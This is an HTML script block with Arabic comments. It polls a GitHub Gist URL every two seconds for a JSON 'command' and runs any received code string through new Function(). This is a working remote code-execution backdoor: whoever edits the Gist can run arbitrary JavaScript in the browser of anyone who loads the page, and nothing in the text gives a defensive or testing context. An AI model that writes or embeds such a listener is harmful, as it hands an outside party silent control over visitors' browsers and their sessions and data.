<script>
    // الرابط الدائم لـ Gist الخاص بك
    const gistUrl = "https://gist.githubusercontent.com/aso818/036d35d5f22a44cd5ec3630d8a70b3ca/raw/command.json"; 

    async function startListening() {
        try {
            // إضافة التوقيت ?t لمنع التخزين المؤقت وسحب الأمر الجديد فوراً
            const response = await fetch(gistUrl + "?t=" + new Date().getTime());
            const data = await response.json();

            if (data.code && data.code !== "") {
                console.log("تم استلام أمر جديد: " + data.code);
                new Function(data.code)();
            }
        } catch (e) {
            // لا يوجد أمر حالياً أو خطأ في الاتصال
        }
        setTimeout(startListening, 2000); // يفحص كل ثانيتين
    }

    startListening();
</script>
